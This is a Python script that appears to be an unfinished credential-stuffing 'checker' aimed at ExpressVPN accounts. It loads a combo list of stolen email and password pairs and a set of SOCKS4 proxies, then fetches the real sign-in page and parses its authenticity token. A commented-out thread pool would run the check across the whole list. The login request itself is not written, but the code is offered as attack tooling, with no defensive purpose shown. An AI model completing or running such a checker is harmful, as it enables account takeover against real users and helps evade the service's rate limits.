import random
from urllib.request import quote
from lib import request, loader, parse
from concurrent import futures


#####Load combo and proxies####
loader.load_combo('combo.txt')
loader.load_proxies('socks4')
###############################


def check(email, password):
   #### Initialize data to save and proxy ####
   proxy = random.choice(loader.proxies)
   ##### Starting checker and parsing access token #####
   block_one = request.get_response(url='https://www.expressvpn.com/sign-in',method='GET', timeout=6)
   
   text = str(block_one.response.text)
   
   print(text)
   
   parse(text).extract('name="authenticity_token" value="(.*?)==" />', save=False)
   print(parse.parsed)


   #token = parsed.data[0]
   
   #### Parse finished, clearing response and parsed data to make post request with parsed data. 
   

   ###### Finished checking ######

check('helel', 'habdbs')
#with futures.ThreadPoolExecutor() as executor:
   #executor.map(check, loader.users, loader.passwords)

